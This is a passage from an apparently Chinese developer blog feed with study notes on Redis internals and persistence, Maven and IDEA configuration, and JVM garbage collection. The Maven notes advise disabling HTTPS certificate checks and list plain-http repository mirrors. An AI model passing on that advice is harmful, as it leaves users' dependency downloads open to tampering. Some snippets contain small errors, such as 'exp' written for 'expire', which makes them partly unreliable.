比较麻烦。另外，就是利用交集、并集、差集等操作，可以计算共同喜好，全部的喜好，自己独有的喜好等功能。</p><p>Sorted Set</p><p>Sorted Set 多了一个权重参数 Score，集合中的元素能够按 Score 进行排列。可以做排行榜应用，取 TOP N 操作。Sorted Set 可以用来做延时任务。</p><h2 id="Redis-单线程模型详解"><a href="#Redis-单线程模型详解" class="headerlink" title="Redis 单线程模型详解"></a>Redis 单线程模型详解</h2><p>Redis基于Reactor模式来设计开发了自己的一起额高效的事件处理模型(Netty的线程模型也基于Reactor模式 ,Reactor模式不愧是高性能IO的基石) ，这套事件处理模型对应的是Redis中的文件事件处理器（file event handler）。由于文件事件处理器是单线程运行的， 所以我们一般都说Redis是单线程模型</p><p><img src="../images/Redis/image-20210606225215733.png" alt="image-20210606225215733"></p><p>《Redis 设计与实现》有一段话是如是介绍文件事件的，我觉得写得挺不错。</p><blockquote><p>Redis 基于 Reactor 模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）。文件事件处理器使用 I/O 多路复用（multiplexing）程序来同时监听多个套接字，并根据 套接字目前执行的任务来为套接字关联不同的事件处理器。</p><p>当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关 闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。</p><p><strong>虽然文件事件处理器以单线程方式运行，但通过使用 I/O 多路复用程序来监听多个套接字</strong>，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与 Redis 服务器中其他同样以单线程方式运行的模块进行对接，这保持了 Redis 内部单线程设计的简单性。还是单线程处理 </p></blockquote><p>Redis 6.0 之前使用单线程 主要原因大概有下面3个: </p><ol><li><p>单线编程容易并且更容易维护 </p></li><li><p>Redis 的性能瓶颈不在CPU, 主要在内存和网络 </p></li><li><p>多线程就会存在死锁、线程上下文切换等问题，甚至会影响性能</p></li></ol><h2 id="springboot-中使用-Redis-作为缓存"><a href="#springboot-中使用-Redis-作为缓存" class="headerlink" title="springboot 中使用  Redis 作为缓存"></a>springboot 中使用  Redis 作为缓存</h2><h3 id="可以定义Reids工具类封装JedisTem"><a href="#可以定义Reids工具类封装JedisTem" class="headerlink" title="可以定义Reids工具类封装JedisTem"></a>可以定义Reids工具类封装JedisTem</h3><p>定义工具类封装 redis 中操作redis存储的对象 </p><h2 id="缓存设置过期时间"><a href="#缓存设置过期时间" class="headerlink" title="缓存设置过期时间"></a>缓存设置过期时间</h2><p>一般情况下，我们设置保存的缓存数据的时候都会设置一个过期时间。为什么呢？</p><p>因为内存是有限的，如果缓存中的所有数据都是一直保存的话，分分钟直接 Out of memory。</p><p>Redis 自带了给缓存数据设置过期时间的功能，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; exp key  60 <span class="comment"># 数据在 60s 后过期</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; setex key 60 value <span class="comment"># 数据在 60s 后过期 (setex:[set] + [ex]pire)</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; ttl key <span class="comment"># 查看数据还有多久过期</span></span><br><span class="line">(<span class="built_in">integer</span>) 56Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure><p>注意：*<em>Redis 中除了字符串类型有自己独有设置过期时间的命令 <code>setex</code> 外，其他方法都需要依靠 <code>expire</code> 命令来设置过期时间 。另外， <code>persist</code> 命令可以移除一个键的过期时间： *</em></p><p><strong>过期时间除了有助于缓解内存的消耗，还有什么其他用么？</strong></p><p>很多时候，我们的业务场景就是需要某个数据只在某一时间段内存在，比如我们的短信验证码可能只在 1 分钟内有效，用户登录的 token 可能只在 1 天内有效。</p><p>如果使用传统的数据库来处理的话，一般都是自己判断过期，这样更麻烦并且性能要差很多。</p><h2 id="Redis-是如何判断数据是否过期的"><a href="#Redis-是如何判断数据是否过期的" class="headerlink" title="Redis 是如何判断数据是否过期的"></a>Redis 是如何判断数据是否过期的</h2><p>Redis 通过一个叫做过期字典（可以看作是 hash 表）来保存数据过期的时间。过期字典的键指向 Redis 数据库中的某个 key(键)，过期字典的值是一个 long long 类型的整数，这个整数保存了 key 所指向的数据库键的过期时间（毫秒精度的 UNIX 时间戳）。</p><p><img src="../images/Redis/image-20210607115909391.png" alt="image-20210607115909391"></p><p>过期字典是存储在redisDb这个结构里的 </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct redisDb&#123;</span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"><span class="keyword">dict </span>*<span class="keyword">dict;</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">dict </span>*expires<span class="comment">; </span></span><br><span class="line">&#125; redisDb;</span><br></pre></td></tr></table></figure><h2 id="过期数据删除策略"><a href="#过期数据删除策略" class="headerlink" title="过期数据删除策略"></a>过期数据删除策略</h2><p>常用的两个过期数据删除策略 (自己造缓存轮子的时候需要格外考虑的东西):</p><ol><li>惰性删除 : 只会在取出key的时候才对数据进行过去过期检查, 这样对CPU 最友好, 但是可能会造成太多过期 key 没有被删除 </li><li>定期删除: 每隔一段时间抽取一批key执行删除过期key 操作. 并且 Redis 底层会通过限制删除操作执行的时长和频率来减少对CPU时间的影响 </li></ol><p>定期删除对内存更加友好，惰性删除对 CPU 更加友好。两者各有千秋，所以 Redis 采用的是 <strong>定期删除+惰性/懒汉式删除</strong> 。</p><p>但是，仅仅通过给 key 设置过期时间还是有问题的。因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就 Out of memory 了。</p><p>怎么解决这个问题呢？答案就是： <strong>Redis 内存淘汰机制。</strong></p><h2 id="Redis-内存淘汰机制"><a href="#Redis-内存淘汰机制" class="headerlink" title="Redis 内存淘汰机制"></a>Redis 内存淘汰机制</h2><p>Redis 提供6种数据淘汰策略 : </p><ol><li><strong>volatile-lru（least recently used）</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰</li><li><strong>volatile-ttl</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰</li><li><strong>volatile-random</strong>：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰</li><li><strong>allkeys-lru（least recently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）</li><li><strong>allkeys-random</strong>：从数据集（server.db[i].dict）中任意选择数据淘汰</li><li><strong>no-eviction</strong>：禁止驱逐数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。这个应该没人使用吧！</li></ol><p>4.0 版本后增加以下两种：</p><ol><li><strong>volatile-lfu（least frequently used）</strong>：从已设置过期时间的数据集(server.db[i].expires)中挑选最不经常使用的数据淘汰</li><li><strong>allkeys-lfu（least frequently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最不经常使用的 key</li></ol><h2 id="Redis-持久化机制-Redis挂掉之后再重启数据可以进行恢复"><a href="#Redis-持久化机制-Redis挂掉之后再重启数据可以进行恢复" class="headerlink" title="Redis 持久化机制 ( Redis挂掉之后再重启数据可以进行恢复)"></a>Redis 持久化机制 ( Redis挂掉之后再重启数据可以进行恢复)</h2><p>快照(Snapshotting, RDB) </p><p>只追加文件(append-only file , AOF ) </p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>Redis 可以通过创建快照来获得存储在内存里面的数据在某个时间点上的副本。Redis 创建快照之后，可以对快照进行备份，可以将快照复制到其他服务器从而创建具有相同数据的服务器副本（Redis 主从结构，主要用来提高 Redis 性能），还可以将快照留在原地以便重启服务器的时候使用。</p><p>快照持久化是 Redis 默认采用的持久化方式，在 Redis.conf 配置文件中默认有此下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">save 900 1           #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 300 10          #在300秒(5分钟)之后，如果至少有10个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 60 10000        #在60秒(1分钟)之后，如果至少有10000个key发生变化，Redis就会自动触发BGSAVE命令创建快照</span><br></pre></td></tr></table></figure><h3 id="AOF持久化"><a href="#AOF持久化" class="headerlink" title="AOF持久化"></a>AOF持久化</h3><p>与快照持久化相比，AOF 持久化 的实时性更好，因此已成为主流的持久化方案。默认情况下 Redis 没有开启 AOF（append only file）方式的持久化，可以通过 appendonly 参数开启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">appendonly yesCopy to clipboardErrorCopied</span><br></pre></td></tr></table></figure><p>开启 AOF 持久化后每执行一条会更改 Redis 中的数据的命令，Redis 就会将该命令写入硬盘中的 AOF 文件。AOF 文件的保存位置和 RDB 文件的位置相同，都是通过 dir 参数设置的，默认的文件名是 appendonly.aof。</p><p>在 Redis 的配置文件中存在三种不同的 AOF 持久化方式，它们分别是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">appendfsync always    #每次有数据修改发生时都会写入AOF文件,这样会严重降低Redis的速度</span><br><span class="line">appendfsync everysec  #每秒钟同步一次，显示地将多个写命令同步到硬盘</span><br><span class="line">appendfsync no        #让操作系统决定何时进行同步Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure><p>为了兼顾数据和写入性能，用户可以考虑 appendfsync everysec 选项 ，让 Redis 每秒同步一次 AOF 文件，Redis 性能几乎没受到任何影响。而且这样即使出现系统崩溃，用户最多只会丢失一秒之内产生的数据。当硬盘忙于执行写入操作的时候，Redis 还会优雅的放慢自己的速度以便适应硬盘的最大写入速度。</p><p><strong>相关 issue</strong> ：<a href="https://github.com/Snailclimb/JavaGuide/issues/783" target="_blank" rel="noopener">783：Redis 的 AOF 方式</a></p><p><strong>拓展：Redis 4.0 对于持久化机制的优化</strong></p><p>Redis 4.0 开始支持 RDB 和 AOF 的混合持久化（默认关闭，可以通过配置项 <code>aof-use-rdb-preamble</code> 开启）。</p><p>如果把混合持久化打开，AOF 重写的时候就直接把 RDB 的内容写到 AOF 文件开头。这样做的好处是可以结合 RDB 和 AOF 的优点, 快速加载同时避免丢失过多的数据。当然缺点也是有的， AOF 里面的 RDB 部分是压缩格式不再是 AOF 格式，可读性较差。</p><p><strong>补充内容：AOF 重写</strong></p><p>AOF 重写可以产生一个新的 AOF 文件，这个新的 AOF 文件和原有的 AOF 文件所保存的数据库状态一样，但体积更小。</p><p>AOF 重写是一个有歧义的名字，该功能是通过读取数据库中的键值对来实现的，程序无须对现有 AOF 文件进行任何读入、分析或者写入操作。</p><p>在执行 BGREWRITEAOF 命令时，Redis 服务器会维护一个 AOF 重写缓冲区，该缓冲区会在子进程创建新 AOF 文件期间，记录服务器执行的所有写命令。当子进程完成创建新 AOF 文件的工作之后，服务器会将重写缓冲区中的所有内容追加到新 AOF 文件的末尾，使得新旧两个 AOF 文件所保存的数据库状态一致。最后，服务器用新的 AOF 文件替换旧的 AOF 文件，以此来完成 AOF 文件重写操作</p><h3 id="Redis的AOF方式"><a href="#Redis的AOF方式" class="headerlink" title="Redis的AOF方式"></a>Redis的AOF方式</h3><p>当磁盘无法满足写入速度，并且后台 <code>fsync(2)</code> 调用花费的时间超过 1 秒时，那么 <code>Redis</code> 可能会将该次 <code>AOF</code> 写入操作延迟最多一秒钟后执行（延迟是为了避免该写入操作会阻塞主线程，因为 <code>fsync(2)</code> 在后台线程是针对同一文件描述符运行的)。但是如果 <code>fsync(2)</code> 在这两秒内都没有正常执行完，那么 <code>Redis</code> 最终将强行执行（可能阻塞）<code>write(2)</code> 函数以将数据正确的传输到磁盘。</p><p>例如在 00:00 的时候，<code>Redis</code> 在 <code>everysec</code> 策略下，此时需要执行 <code>AOF</code> （<code>fsync</code> 函数）。但是在这 00:00 时刻，服务器上的另一个应用程序有大量写入的操作占用了当前磁盘的写入缓冲区。那么在这一秒，<code>fsync</code> 函数可能会超时失败（如果没有超时设置，那么在这 00:00，服务器上的磁盘大量写入，导致服务器所有应用（包括 <code>Redis</code> 自己）会导致主线程的写入阻塞）。<code>Redis</code> 为了优雅的解决这个问题，当 <code>fsync</code> 函数执行超时失败时，会使用延迟写入策略：会在 00:01 的时候写入本该 00:00 写入的文件（但是这种情况下出现异常，会导致 2s 的数据丢失？），如果在 00:01 的时候写入操作都执行超时，那么 <code>Redis</code> 会强行执行 <code>write(2)</code> 函数。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/maven-ssm</title>
      <link href="java/maven-ssm/"/>
      <url>java/maven-ssm/</url>
      
        <content type="html"><![CDATA[<h1 id="结合maven学习spring框架的后端之旅"><a href="#结合maven学习spring框架的后端之旅" class="headerlink" title="结合maven学习spring框架的后端之旅"></a>结合maven学习spring框架的后端之旅</h1><a id="more"></a><h2 id="一些基础要点"><a href="#一些基础要点" class="headerlink" title="一些基础要点"></a>一些基础要点</h2><h3 id="maven-下载依赖问题"><a href="#maven-下载依赖问题" class="headerlink" title="maven 下载依赖问题"></a>maven 下载依赖问题</h3><p>maven</p><p>配置conf 中setting.xml文件   本地仓库   镜像</p><p>idea配置pom.xml    后刷新maven中仓库信息</p><p>setting 中找到maven 处修改maven本地目录</p><p>maven 依赖不好拉  注意依赖的版本和冲突   </p><p>人生建议，有加速器就挂加速器直接从中央仓库拉取，配置阿里云仓库会出现莫名其秒的报错+有些jar文件下载失败</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 阿里云仓库 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 中央仓库1 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>repo1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo1.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 中央仓库2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>repo2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo2.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决maven一些问题"><a href="#解决maven一些问题" class="headerlink" title="解决maven一些问题"></a>解决maven一些问题</h2><h3 id="解决maven中不能直接创建Servlet文件和filter文件问题"><a href="#解决maven中不能直接创建Servlet文件和filter文件问题" class="headerlink" title="解决maven中不能直接创建Servlet文件和filter文件问题"></a>解决maven中不能直接创建Servlet文件和filter文件问题</h3><p>在 Project Structure中设定src/main/java为sourceRoot</p><p>再在web项目中iml文件中添加如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sourceRoots</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">url</span>=<span class="string">"file://$MODULE_DIR$/src/main/java"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">sourceRoots</span>&gt;</span></span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;module type&#x3D;&quot;JAVA_MODULE&quot; version&#x3D;&quot;4&quot;&gt;</span><br><span class="line">  &lt;component name&#x3D;&quot;FacetManager&quot;&gt;</span><br><span class="line">    &lt;facet type&#x3D;&quot;web&quot; name&#x3D;&quot;Web&quot;&gt;</span><br><span class="line">      &lt;configuration&gt;</span><br><span class="line">        &lt;descriptors&gt;</span><br><span class="line">          &lt;deploymentDescriptor name&#x3D;&quot;web.xml&quot; url&#x3D;&quot;file:&#x2F;&#x2F;$MODULE_DIR$&#x2F;web&#x2F;WEB-INF&#x2F;web.xml&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;descriptors&gt;</span><br><span class="line">        &lt;webroots&gt;</span><br><span class="line">          &lt;root url&#x3D;&quot;file:&#x2F;&#x2F;$MODULE_DIR$&#x2F;web&quot; relative&#x3D;&quot;&#x2F;&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;webroots&gt;</span><br><span class="line">        &lt;sourceRoots&gt;</span><br><span class="line">          &lt;root url&#x3D;&quot;file:&#x2F;&#x2F;$MODULE_DIR$&#x2F;src&#x2F;main&#x2F;java&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;sourceRoots&gt;</span><br><span class="line">      &lt;&#x2F;configuration&gt;</span><br><span class="line">    &lt;&#x2F;facet&gt;</span><br><span class="line">  &lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;module&gt;</span><br></pre></td></tr></table></figure><h3 id="一般maven中依赖文件夹内需要的文件"><a href="#一般maven中依赖文件夹内需要的文件" class="headerlink" title="## 一般maven中依赖文件夹内需要的文件"></a>## 一般maven中依赖文件夹内需要的文件</h3><p>一个.jar和一个.pom文件, 注意自己手动下载时修改文件名时确认好</p><h2 id="setting-中maven"><a href="#setting-中maven" class="headerlink" title="setting 中maven"></a>setting 中maven</h2><p><img src="../images/maven-ssm/image-20210411131622171.png" alt="image-20210411131622171"></p><p>勾选 Delegate IDE build/run actions to Maven 后将会将java类的运行委托给 maven ,</p><p>此时需要用到</p><p><img src="../images/maven-ssm/image-20210411131721540.png" alt="image-20210411131721540"></p><p>但 ,总会报错, 你懂的, 测试程序类时候不要勾选了还是, 有需要时配置 </p><p>配置阿里云 镜像时需要加上忽略https的ssl证书验证 </p><p>-Dmaven.wagon.http.ssl.insecure=true -Dmaven.wagon.http.ssl.allowall=true</p><p><img src="../images/maven-ssm/v2-e3bbb645b913485826c4ec85416958f6_720w.jpg" alt="img"></p><p>以防万一,两个地方都加上</p><p>这里加的是这条语句</p><p>-Dmaven.wagon.http.ssl.insecure=true -Dmaven.wagon.http.ssl.allowall=true -Dmaven.wagon.http.ssl.ignore.validity.dates=true</p><p><img src="../images/maven-ssm/v2-e6dcc8da4821243f964262ed5e7ec295_720w.jpg" alt="img"></p><p>依赖出问题, </p><p>配本地仓库, 删了重新下载 </p><p>重新创建pom.xml文件</p><p>idea 自动还原mavn默认配置  , 在  idea 的  </p><p>在 c盘</p><p>project.default.xml 文件中添加</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;component <span class="type">name</span>="MavenImportPerferences"&gt;</span><br><span class="line">  &lt;<span class="keyword">option</span> <span class="type">name</span>="generalSettings"&gt;</span><br><span class="line">    &lt;MavenGeneralSettings&gt;</span><br><span class="line">      &lt;<span class="keyword">option</span> <span class="type">name</span>="localRepository" <span class="keyword">value</span>="E:\programsoftware\apache-maven-3.6.3\repo" /&gt;</span><br><span class="line">      &lt;<span class="keyword">option</span> <span class="type">name</span>="mavenHome" <span class="keyword">value</span>="E:\programsoftware\apache-maven-3.6.3"/&gt;</span><br><span class="line">      &lt;<span class="keyword">option</span> <span class="type">name</span>="userSettingsFile" <span class="keyword">value</span>="E:\programsoftware\apache-maven-3.6.3\conf\settings.xml"/&gt;</span><br><span class="line">    &lt;/MavenGeneralSettings&gt;</span><br><span class="line">  &lt;/<span class="keyword">option</span>&gt;</span><br><span class="line">&lt;/component&gt;</span><br></pre></td></tr></table></figure><h2 id="父子模块"><a href="#父子模块" class="headerlink" title="父子模块"></a>父子模块</h2><p>以下配置<packaging>pom</packaging>的意思是使用maven分模块管理，都会有一个父级项目，pom文件一个重要的属性就是packaging（打包类型），一般来说所有的父级项目的packaging都为pom，packaging默认类型jar类型，如果不做配置，maven会将该项目打成jar包。</p><p><img src="../images/maven-ssm/image-20210427181728645.png" alt="image-20210427181728645"></p><h3 id="mvn-clean"><a href="#mvn-clean" class="headerlink" title="mvn clean"></a>mvn clean</h3><p>进行依赖更换和拉取</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/JVM垃圾回收</title>
      <link href="java/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"/>
      <url>java/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="jvm-垃圾回收"><a href="#jvm-垃圾回收" class="headerlink" title="jvm 垃圾回收"></a>jvm 垃圾回收</h1><a id="more"></a><h2 id="本节常见面试题："><a href="#本节常见面试题：" class="headerlink" title="本节常见面试题："></a>本节常见面试题：</h2><p>问题答案在文中都有提到</p><ul><li>如何判断对象是否死亡（两种方法）。</li><li>简单的介绍一下强引用、软引用、弱引用、虚引用（虚引用与软引用和弱引用的区别、使用软引用能带来的好处）。</li><li>如何判断一个常量是废弃常量</li><li>如何判断一个类是无用的类</li><li>垃圾收集有哪些算法，各自的特点？</li><li>HotSpot为什么要分为新生代和老年代？</li><li>常见的垃圾回收器有那些？</li><li>介绍一下CMS,G1收集器。</li><li>Minor Gc和Full GC 有什么不同呢？</li></ul><h2 id="阅读导火索"><a href="#阅读导火索" class="headerlink" title="阅读导火索"></a>阅读导火索</h2><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210608151109521.png" alt="image-20210608151109521"></p><p>当需要排查各种 内存溢出问题、当垃圾收集成为系统达到更高并发的瓶颈时，我们就需要对这些”自动化”的技术实施必要的监控和调节</p><h2 id="JVM-内存分配与回收的神秘面纱"><a href="#JVM-内存分配与回收的神秘面纱" class="headerlink" title="JVM 内存分配与回收的神秘面纱"></a>JVM 内存分配与回收的神秘面纱</h2><p>Java 的自动内存管理主要是针对对象内存的回收和对象内存的分配. 同时, Java 自动内存管理最核心的功能是 堆 内存中对象的分配与回收 </p><p>JDK1.8 之前的堆内存示意图:</p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210608183623154.png" alt="image-20210608183623154"></p><p>从上图可以看出堆内存分为新生代、老年代和永久代。新生代又被进一步分为： Eden区 + Survivor1区 + Survivor2 区， 值得注意的是，在JDK 1.8中移除整个永久代，取而代之的是一个叫原空间（Metaspace）的区域（永久代使用的是JVM的堆内存空间，而原空间使用的是物理内存，直接受到本机的物理内存限制）</p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210608184143121.png" alt="image-20210608184143121"></p><h3 id="对象优先在eden区分配"><a href="#对象优先在eden区分配" class="headerlink" title="对象优先在eden区分配"></a>对象优先在eden区分配</h3><p>目前主流的垃圾收集器都会采用分代回收算法， 因此需要将堆内存分为新生代和老年代，这样我们就可以根据各个年代的特点选择合适的垃圾收集算法</p><p>大多数情况下，对象在新生代eden区分配。当eden区没有足够空间进行分配时，虚拟机将发起一次minor Gc, 下面我们来进行实际测试一下 </p><p>在测试之前来看看Minor GC 和 Full GC有什么不同 ？</p><ul><li>新生代 GC（Minor GC）：指发生新生代的垃圾收集动作，Minor GC 非常频繁，回收速度一般也比较快 </li><li>老年代GC （Major GC/Full GC) ：指发生在老年代的GC，出现了Major GC经常会伴随至少一次的Minor GC（并非绝对），Major GC的速度一般会比 Minor GC的慢10倍以上。 </li></ul><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">GCTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">byte</span>[] allocation1,allocation2;</span><br><span class="line">      allocation1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">30900</span>*<span class="number">1024</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在VM参数中加上  -XX:+PrintGCDetails</p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210608213758788.png" alt="image-20210608213758788"></p><p>得到结果</p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210608213805922-1623159488442.png" alt="image-20210608213805922"></p><p>从图上可以看到eden区已经分配了一大半，即使程序什么也不做</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allocation2</span> = new byte[<span class="number">900</span>*<span class="number">1024</span>]<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210608215232057.png" alt="image-20210608215232057"></p><p>可以看到eden区所使用变大了，因为给allocation2需要分配内存， 如果给allocation2分配内存时候eden区内存几乎已经分配完了，</p><p>那么虚拟机将再发起一次Minor GC，GC期间虚拟机又发现allocation1无法存入Survivor空间， 所以将会通过 <strong>分配担保机制</strong>把新生代的对象提前转移到老年代中去，老年代上的空间足够存放allocation1， 所以不会出现Full GC。 执行Minor GC后， 后面分配的对象如果能够存在eden区的话， 还是会在eden区分配内存，可以执行如下代码验证： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GCTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span 